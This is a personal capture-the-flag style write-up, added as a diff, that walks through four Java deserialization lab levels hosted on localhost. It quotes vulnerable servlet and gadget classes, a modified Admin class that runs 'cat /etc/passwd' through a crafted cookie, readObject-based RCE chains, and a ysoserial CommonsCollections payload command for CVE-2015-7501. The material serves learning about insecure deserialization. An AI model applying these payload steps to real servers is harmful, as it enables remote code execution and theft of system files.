@@ -1,0 +1,520 @@
+	
+	
+	
+	[-Prerequisites-]
+	
+		This file is quite large so i use AI for generating the structure based on my structure on pathTraversal write-up
+		
+		
+			Level 1----------------[DIR] deserialize-lv1
+			|                      
+			|
+			|------[DIR] .vscode
+			|       |               
+			|       |------[FILE] launch.json:      VS Code configuration files
+			|
+			|------[DIR] src
+			|       |              
+			|       |------[DIR] main:     Source files for the Java project
+			|       |       |       
+			|       |       |------[DIR] java/com/example/javadeserialize
+			|       |       |       |   
+			|       |       |       |------[FILE] Admin.java
+			|       |       |       |------[FILE] HelloServlet.java:     Three main java file contain the necessary class for exploitation
+			|       |       |       |------[FILE] User.java
+			|       |       |
+			|       |       |------[DIR] webapp: : Web application files
+			|       |       |       |   
+			|       |       |       |------[DIR] WEB-INF
+			|       |       |       |       |   
+			|       |       |       |       |------[FILE] web.xml:     Web application configuration files
+			|       |       |       |
+			|       |       |       |------[FILE] index.jsp
+			|       |
+			|       |------[DIR] target: : Compiled output directory
+			|       |       |       
+			|       |       |------[DIR] classes/com/example/javadeserialize
+			|       |       |       |   
+			|       |       |       |------[FILE] Admin.class
+			|       |       |       |------[FILE] HelloServlet.class: 	Compiled Java classes
+			|       |       |       |------[FILE] User.class
+			|       |       |
+			|       |       |------[DIR] test-classes: 	 Compiled test classes
+			|       |               
+			|
+			|------[FILE] pom.xml:		Project Object Model for Maven
+			|                   
+			|
+			|
+			|
+			|------[DIR] setup:		 Setup scripts or configuration
+			|                  
+			|
+			|------[FILE] build.sh:		 Build script for the project
+			|                   
+			|
+			|------[FILE] docker-compose.yaml:		 Docker compose configuration
+			|                   
+			|
+			|------[FILE] README.md:		 Project instructions or documentation
+			
+		
+		So this is the structure of level1, which is kinds of similar to level 2, 3 and 4
+		Im not an expert on web developer, but i know all of these thing is the setting up for servlet.
+		
+		*Note from level 4*
+		
+		The pom.xml file serves as the central configuration file for Maven projects, defining everything needed to build and manage the project.
+	
+	[ChatGPT]
+	
+		[!] Servlet is a Java class that extends the capabilities of servers that host applications accessed by means of a request-response programming model. 
+		    They are typically web browser and commonly used to extend the functionality of web servers or application servers.
+		    Servlets require a servlet container or servlet engine (e.g., Apache Tomcat, Jetty) to run.
+		    
+		=> BUT the main character today is the 3 classes ------[DIR] java/com/example/javadeserialize
+									 |   
+								       [FILE] Admin.java
+								       [FILE] HelloServlet.java:     
+								       [FILE] User.java
+		  	
+		  	
+	[-Exploitation-]
+	
+	
+	
+			      ----------------------------------level 1----------------------------------
+			      |                                    					|
+			      |          http://localhost:13337/java-deserialize-lv1-1.0-SNAPSHOT       |     
+			      |                                    					|
+			      ---------------------------------------------------------------------------
+			      
+						
+	[HelloServlet.java]
+	
+	
+				--------------------------------------------------------------------------
+				package com.example.javadeserialize;		// import deserialize libs
+
+				import java.io.*;				// import all sub-packages of input-output package
+				import java.util.Arrays;			
+				import java.util.Base64;
+				import java.util.Map;
+				import java.util.stream.Collectors;		// import libs for getting bytes stream
+				import javax.servlet.http.*;			
+				import javax.servlet.annotation.*;		// import servlet
+
+				@WebServlet(name = "helloServlet", value = "/hello-servlet")		      // define a servlet component and specify its configuration details.
+				public class HelloServlet extends HttpServlet {				      // define a new class extend from built-in servlet class
+				    public String serializeToBase64(Serializable obj) throws IOException {    
+					ByteArrayOutputStream output = new ByteArrayOutputStream();
+					ObjectOutputStream oos = new ObjectOutputStream(output);
+					oos.writeObject(obj);
+					oos.close();
+					return Base64.getEncoder().encodeToString(output.toByteArray());	// Function for serializing object to Base64
+				    }
+
+				    private static Object deserializeFromBase64(String s) throws IOException, ClassNotFoundException {
+					byte[] data = Base64.getDecoder().decode(s);
+					ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
+					Object o  = ois.readObject();
+					ois.close();
+					return o;								// Function for deserializing object from Base64
+				    }
+
+				    public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+					try {
+					    response.setContentType("text/html");
+					    PrintWriter out = response.getWriter();
+					    // Get list of cookie
+					    Map<String, String> cookieMap = Arrays.stream(request.getCookies()).collect(Collectors.toMap(Cookie::getName, Cookie::getValue));
+					    // Check is user cookie has already set
+					    User user;
+					    if (!cookieMap.containsKey("user")) {          // If not user, create a new user
+						user = new User();
+						Cookie cookie = new Cookie("user", serializeToBase64(user));
+						response.addCookie(cookie);
+					    } else {
+						try {
+						    user = (User)deserializeFromBase64(cookieMap.get("user"));		// If is the user, get user from deserialize the cookie
+						} catch (Exception e) {
+						    out.println("Please don't hack me");
+						    e.printStackTrace();
+						    return;
+						}
+					    }
+					    out.println("<html><body>");
+					    out.println("<h1>Level 1 Hello " + user + "</h1>");
+					    out.println("</body></html>");
+					} catch (Exception e) {
+					    response.setContentType("text/html");
+					    PrintWriter out = response.getWriter();
+					    out.println("Something went wrong");
+					    return;
+					}
+				    }
+
+				    public void doPost(HttpServletRequest request, HttpServletResponse response) throws IOException {
+					doGet(request, response);
+				    }
+
+				    public void destroy() {
+				    }
+				}
+				--------------------------------------------------------------------------------------------------------
+		
+		
+		=> So this is simply a servlet web, which checks you are user or not by a if-else statement(based on cookie, cookie takes
+		   the value is your object after be serialized, then print to screen who you are.
+		
+	[User.java]
+	
+				--------------------------------------------
+				package com.example.javadeserialize;
+
+				import java.io.*;
+
+				public class User implements Serializable {		// allows the object can be serialized
+				    private String name;
+				    public User() {
+					this.name = "Guest";
+				    }
+
+				    @Override
+				    public String toString() {				// Normal attributes
+					return this.name;
+				    }
+
+				    public String getName() {
+					return this.name;
+				    }
+
+				}
+				-------------------------------------------
+				
+		=> Seems like User just the normal user!
+		
+	[Admin.java]
+	
+				---------------------------------------------
+				package com.example.javadeserialize;
+
+				import java.io.BufferedReader;
+				import java.io.IOException;
+				import java.io.InputStreamReader;
+
+				public class Admin extends User {			// inherit from User
+				    private String getNameCMD;
+				    public Admin() {
+					this.getNameCMD = "whoami";			// Sus
+				    }
+
+				    @Override						// Override method
+				    public String toString() {
+					try {
+					    Process proc = Runtime.getRuntime().exec(this.getNameCMD);					// Executing command ????
+					BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));  
+					    return stdInput.readLine();									// Returning the output after execute command ?????
+					} catch (IOException e) {
+					    return "";
+					}
+				    }
+				}
+				----------------------------------------------
+	
+	 	[!] SO, it is obvious that we gonna use class Admin for exploiting, when we have: +------ Admin extends from User
+												  |
+												  |------ Executable and override method "toString()"							
+												  |
+												  +------ Return the output of executed command
+												  
+	
+		
+		   Thanks to CBJS when created for us a deserialize-exploit-tool.
+		   
+		=> So the mindset is, we take advantage of class Admin extends from User, so the if-else statement on HelloServlet.java can not bring us to
+		   the if statement (create a new User)
+		
+		=> Then we are in the else statement, our User is given from the cookie by deserialization
+		
+		[!] SOOO, what if we change our User cookie to what Admin have?
+		
+	         => YES, the server will deserialize that cookie 
+	      ====> We become the admin, then executing the command 
+	      
+		[!] Adding all file in lv1, and replace all file in deserialize-exploit-tool
+		
+		
+	[HelloServlet.java]
+
+			    	----------------------------------------------------------------------------------------------------
+			    	...
+			    	public void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
+					try {
+					    response.setContentType("text/html");
+					    PrintWriter out = response.getWriter();
+					    Map<String, String> cookieMap = Arrays.stream(request.getCookies()).collect(Collectors.toMap(Cookie::getName, Cookie::getValue));
+					    User user = new Admin();      // We are Admin now!!!
+					    out.println("<html><body>");
+					    out.println("<h1>Payload: " + serializeToBase64(user) + "</h1>"); // print out the serialized payload
+					    out.println("</body></html>");
+					} 
+			    	...
+			    	}
+			   	 -----------------------------------------------------------------------------------------------------
+
+        [Admin.java]
+			    	--------------------------------------------
+			   	 ... 
+			   	 public class Admin extends User {
+					private String getNameCMD;
+					public Admin() {
+				    	this.getNameCMD = "cat /etc/passwd";
+					}
+			    	 ...
+			   	 }
+			   	 --------------------------------------------
+			    
+ 		
+ 		=> Now, cleaning the maven and restart the lab (build.sh option 5), it will recompiling the source code to file .war, and replace the old one
+ 	
+ 		=> Payload: rO0ABXNy...9wYXNzd2Q=
+ 	
+ 		[!] Then replace the cookie by our payload!
+ 	
+  	[http://localhost:13337/deserialize-exploit-1.0-SNAPSHOT/hello-servlet]
+  	
+  		Hello root:x:0:0:root:/root:/bin/bash
+  		
+  		=> EXPLOITED!
+  	
+  	
+  	
+  			      ----------------------------------level 2----------------------------------
+			      |                                    					|
+			      |          http://localhost:13337/java-deserialize-lv2-1.0-SNAPSHOT       |     
+			      |                                    					|
+			      ---------------------------------------------------------------------------
+			      
+  		We take a look around, then here is the most suspicious
+  		
+  	[MyHTTPClient.java]
+  	
+				-------------------------------------------------
+				 ...
+				public class MyHTTPClient extends HTTPConnection {
+				    private String host;
+
+				    public MyHTTPClient(String host)  {
+				        super("http://" + host); 
+				        this.host = host;
+				    }
+
+				    public void sendRequest() {
+				        String path = "/bin/bash";
+				        ProcessBuilder pb = new ProcessBuilder(path, "-c", "curl " + this.host); 
+				        try {
+				            Process curlProcess = pb.start();
+				        } catch (IOException e) {
+				            e.printStackTrace();
+				        }
+				    }
+
+
+				    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, InterruptedException {
+				        in.defaultReadObject();
+				        String path = "/bin/bash";
+				        ProcessBuilder pb = new ProcessBuilder(path, "-c", "ping " + this.host);
+				        Process ping = pb.start();
+				        int exitCode = ping.waitFor();
+				    }
+				}
+				-----------------------------------------------------------
+				
+				
+		[!] You can see, noteable that the readObject function takes the argument is the bytes stream in, then it executing the processBuilder pb
+		
+		[=>] So we look around that where the function readObject executed:
+		
+		
+	[HelloServlet.java]
+  	
+  				------------------------------------------------------------------------
+  				...
+  				.....
+  				public Object deserializeFromBase64(String s) throws IOException, ClassNotFoundException {
+				byte[] data = Base64.getDecoder().decode(s);
+				ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
+				Object o  = ois.readObject();
+				ois.close();
+				return o;
+			    	}
+			    	...
+			    	.....
+			    	--------------------------------------------------------------------------
+			    	
+		[!] Here it is, the function readObject() inside the function deserializeFromBase64(), which is called later:
+		
+	[HelloServlet.java]
+	
+				----------------------------------------------------------------------
+				try {
+		                    user = (User)deserializeFromBase64(cookieMap.get("user")); // This line is where our payload is processed and execute
+		                } catch (Exception e) {
+		                    out.println("Please don't hack me");
+		                    e.printStackTrace();
+		                    return;
+				-----------------------------------------------------------------------
+				
+				
+		[!] So, our goal is creating a serialized payload  =>  got deserialize  =>  executed readObject() function  =>  RCE!
+		
+		[==>] DO the same as previous level for creating payload 
+		
+		
+		=> EXPLOITED!
+		
+			      ----------------------------------level 3----------------------------------
+			      |                                    					|
+			      |          http://localhost:13337/java-deserialize-lv3-1.0-SNAPSHOT       |     
+			      |                                    					|
+			      ---------------------------------------------------------------------------
+			      
+		Let take a look around
+		
+	[MyHTTPClient.java]
+				--------------------------------------------------------------------
+			    	...	
+			    	public void sendRequest() { 
+				String path = "/bin/bash";
+				ProcessBuilder pb = new ProcessBuilder(path, "-c", "curl " + this.host);
+				try {
+				    Process curlProcess = pb.start();
+				} catch (IOException e) {
+				    e.printStackTrace();
+				}
+			   	}
+
+			   	@Override
+			    	public void connect() throws IOException, InterruptedException {            // Here it is 
+				String path = "/bin/bash";
+				ProcessBuilder pb = new ProcessBuilder(path, "-c", "ping " + this.host);
+				Process ping = pb.start();
+				int exitCode = ping.waitFor();
+			    	}
+			    	...
+			    	----------------------------------------------------------------------------
+
+    	[TestConnection.java]
+				------------------------------------------------------------------------
+				...
+				public class TestConnection implements Serializable {
+					public HTTPConnection connection;
+					public TestConnection(HTTPConnection connection) {
+					    this.connection = connection;
+					}
+					private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException, InterruptedException {  // here readObject() again
+
+					    in.defaultReadObject();
+					    this.connection.connect(); // [?] Told you so (^.^*)
+					}
+				}
+				---------------------------------------------------------------------------
+
+    		Because every "HelloServlet.java" files are the same, just need to fix a little bit and things gonna work smoothly
+
+            [==>] So the flow is:  serialized payload  =>  got deserialized  =>  readObject() invoked  =>  connect() override and invoked  =>  RCE!
+            
+            [==>] DO the same as previous level for creating payload.
+		
+		
+		=> EXPLOITED!
+            
+		
+			      ---------------------------------level 4-----------------------------------
+			      |                                    					|
+			      |          http://localhost:13337/java-deserialize-lv4-1.0-SNAPSHOT       |     
+			      |                                    					|
+			      ---------------------------------------------------------------------------
+			      
+		This time is actually the final boss!      
+		
+		All class we have is only "User.java" and "HelloServlet.java", so we need to think out of the box, the vuln does not come from the class
+		
+	   [==>] What about other files? So i take a look around again so i found pom.xml that
+	   
+	[pom.xml]
+	
+				----------------------------------------
+				...
+				....
+				<dependency>
+				    <groupId>commons-collections</groupId>
+				    <artifactId>commons-collections</artifactId>
+				    <version>3.1</version>
+				</dependency>
+				....
+				...
+				-----------------------------------------
+
+	
+		[!] <dependency> declaration states that the project requires the commons-collections library version 3.1 provided by the commons-collections group
+		
+		[==>] Do some research, i know that exist a CVE abt it  ===>  CVE-2015-7501
+		
+		[!] I know the CVE, lets search about the PoC 
+		
+		[==>] https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/CVE%20Exploits/JBoss%20CVE-2015-7501.py
+		
+		[!] Then this tells me that i should use a tool "ysoserial", usage:
+		
+			Usage: java -jar ysoserial-all.jar [payload] '[command]'
+			Available payload types:
+			Payload             Authors                     Dependencies
+			-------             -------                     ------------
+			...
+			CommonsCollections1 @frohoff                    commons-collections:3.1
+			...
+			CommonsCollections5 @matthias_kaiser, @jasinner commons-collections:3.1
+			CommonsCollections6 @matthias_kaiser            commons-collections:3.1
+	
+	[Terminal]
+			
+		 java -jar ysoserial-all.jar CommonsCollections7 [your_command_here]
+		 
+		 [==>] Then we got a serialized payload
+		 
+	=> EXPLOITED!
+		
+		
+
+		
+		
+		
+		
+		
+	   
+	 
+	   
+	   
+		
+			      
+	
+		
+		  
+		
+	
+
+ 	
+ 			
+ 			
+ 			
+
+
+
+
+	
+	
+	
+	
+		
